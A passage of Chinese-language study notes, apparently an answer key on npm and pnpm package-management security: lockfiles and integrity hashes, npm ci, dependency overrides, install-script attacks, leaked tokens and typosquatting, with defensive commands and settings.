> 導致**你的程式碼可以 `require()` 沒有宣告的套件而不報錯**（幽靈相依）；
> **pnpm 用嚴格的 symlink 樹** ——
> **`node_modules/` 中只有你明確宣告的套件**，用未宣告的相依會直接失敗。
>
> **Q2.** ①**需要 lock 檔**：`install` 不需要，**`ci` 必須有**；
> ②**會不會修改 lock**：`install` 會，**`ci` 不會**；
> ③**lock 與 package.json 不符時**：`install` 自動更新 lock，
> **`ci` 直接失敗**（★ 這是優點，提早發現問題）；
> ④**安裝前**：`ci` **會先刪除 `node_modules`**（確保乾淨），`install` 不會；
> ⑤**速度**：`ci` 快很多。
> **正式環境必須用 `npm ci`** ——
> `install` 可能自動更新 lock 檔裝到與測試環境不同的版本，
> 造成「測試正常、正式炸掉」，還會留下未提交的 git 變更。
>
> **Q3.** **`integrity` 是套件內容的 SHA-512 雜湊**：
> ```json
> "integrity": "sha512-v2kDEe57lecTulaDIuNTPy3Ry4gLGJ6Z1O3vE1krgXZ..."
> ```
> **安裝時會驗證下載的內容是否與雜湊相符** ——
> 若 registry 被入侵、CDN 被竄改、或有中間人攻擊，
> **安裝會失敗，而不是裝到被竄改的惡意程式碼**。
> **所以 lock 檔不只是「鎖版本」，更是「鎖內容」** ——
> 這是它必須進 git 的重要理由之一。
>
> **Q4.** **通常不是 pnpm 的 bug，而是「你的專案一直在偷用未宣告的相依」**
> （幽靈相依 / phantom dependency）。
> npm 的扁平化會把間接相依提升到頂層，
> 例如你只宣告了 `express`，但 `express` 依賴 `debug`，
> npm 把 `debug` 放到 `node_modules/` 頂層，
> **你的程式碼 `require('debug')` 就能運作** ——
> 但這很危險：**某天 express 換掉 debug，你的程式碼就壞掉了**。
> **正確做法**：`pnpm add debug`（把它加進 `package.json`）。
> 暫時的繞道是 `.npmrc` 設 `shamefully-hoist=true`，但不建議長期使用。
>
> **Q5.** **流程**：
> ①攻擊者發布一個看似無害的套件（或**入侵既有熱門套件的維護者帳號**）；
> ②該套件的 `package.json` 中有 `preinstall`/`install`/`postinstall` script；
> ③你（或你的某個間接相依）安裝它時，**script 自動執行**；
> ④**竊取 `~/.npmrc` 的 token、`~/.ssh/` 金鑰、環境變數、`.env`；植入後門；挖礦**。
> **防護**：
> ①**`npm ci --ignore-scripts`**（★ 最直接）；
> ②**檢視有 install script 的套件**；
> ③**pnpm 10+ 預設不執行 install script**，要用
> `"onlyBuiltDependencies": ["bcrypt","sharp"]` 白名單明確允許（★ 安全優勢）。
>
> **Q6.** **代價**：**原生模組無法編譯**（`bcrypt`、`sharp`、`canvas`、
> `better-sqlite3`），某些套件的必要初始化不會執行
> （`husky` 安裝 git hooks、`puppeteer` 下載 Chromium）。
> **實務做法**：
> ```bash
> npm ci --omit=dev --ignore-scripts       # ① 先停用全部
> npm rebuild bcrypt sharp                 # ② ★ 只對明確信任的套件重建
> ```
> 或用 **pnpm 的白名單機制**：
> ```json
> { "pnpm": { "onlyBuiltDependencies": ["bcrypt", "sharp", "esbuild"] } }
> ```
> 重點是**從「預設全部允許」改成「預設全部禁止，明確白名單」**。
>
> **Q7.** 解決**「間接相依有漏洞，但引入它的套件還沒發布修正版」**的問題：
> ```json
> "overrides": { "semver": "^7.5.4" }       // npm
> "resolutions": { "semver": "^7.5.4" }     // yarn
> { "pnpm": { "overrides": { "semver": "^7.5.4" } } }
> ```
> 它會**強制整個相依樹都使用指定的版本**。
> **風險**：這是**繞過套件作者宣告的相依約束** ——
> 該套件可能依賴舊版的特定行為，強制升級後可能出現**難以察覺的相容性問題**。
> **必須跑完整的測試套件**，並在上游套件發布修正版後**移除這個 override**。
>
> **Q8.** **一旦 token 進了 git（即使是私有 repo）就必須視為已洩漏**：
> ①**立刻撤銷該 token**（`npm token revoke <id>`）並產生新的；
> ②從 git 歷史移除（`git filter-repo`）——
> 但**這不能取代撤銷**，因為可能已被 clone；
> ③檢查 Docker image 中是否有殘留（`docker history --no-trunc`）。
> **CI 中的正確做法是用環境變數參照**：
> ```
> # .npmrc（★ 這樣可以進 git）
> //registry.npmjs.org/:_authToken=${NPM_TOKEN}
> ```
> ```bash
> NPM_TOKEN=xxx npm ci
> ```
> Dockerfile 中用 **BuildKit secret**（不會留在 image layer）：
> ```dockerfile
> RUN --mount=type=secret,id=npmrc,target=/root/.npmrc npm ci --omit=dev
> ```
> 而且 **CI 的 token 應該是 read-only**。
>
> **Q9.** **typosquatting 是「註冊與熱門套件名稱極相似的惡意套件」**，
> 利用開發者的拼字錯誤：
> ```
> lodash → lodasch, lodahs, 1odash
> cross-env → crossenv
> express → expres
> ```
> **新增套件前該檢查**：
> ①**下載量**（極低是警訊）；
> ②**建立時間**（★ 剛發布不久的新套件要特別小心）；
> ③**是否有 repository 網址**（沒有是警訊）；
> ④**是否宣告授權**；
> ⑤**維護者是誰**；
> ⑥**★ 是否有 install script**；
> ⑦**相依數量**（越多攻擊面越大）。
> ```bash
> npm view <pkg> --json | jq '{name,version,homepage,repository,maintainers,time}'
> ```
>
> **Q10.** ①**★★ lock 檔進 git** ——
> 含 `integrity` 雜湊，**鎖版本也鎖內容**，不會意外裝到新版；
> ②**★★ 正式環境用 `npm ci`** —— 嚴格依 lock，不會自動更新；
> ③**★★ `--ignore-scripts`** —— 防 install script 攻擊；
> ④**★ `npm audit` 排程化** —— 定期檢查已知漏洞；
> ⑤**★ 新增套件前檢查** —— 下載量、建立時間、倉庫、install script。
> **加上**：⑥內部 registry 鏡像（可審核進入的套件）；
> ⑦**減少相依數量**（一個典型專案有 800+ 個套件，**每一個都是攻擊面**）；
> ⑧CI 中用**最小權限（read-only）的 token** 並定期輪替。

---

## 延伸閱讀

- [[03-PM2-程序管理入門]] — 下一步：程序管理
- [[01-Node-安裝與版本管理]] — corepack 與 packageManager
- [[04-Composer-套件管理]] — PHP 端的對應概念
- [[00-Vue與Nuxt-索引]] — 前端框架的建置流程
- [[08-Git-伺服器端與自動部署]] — 部署流程整合
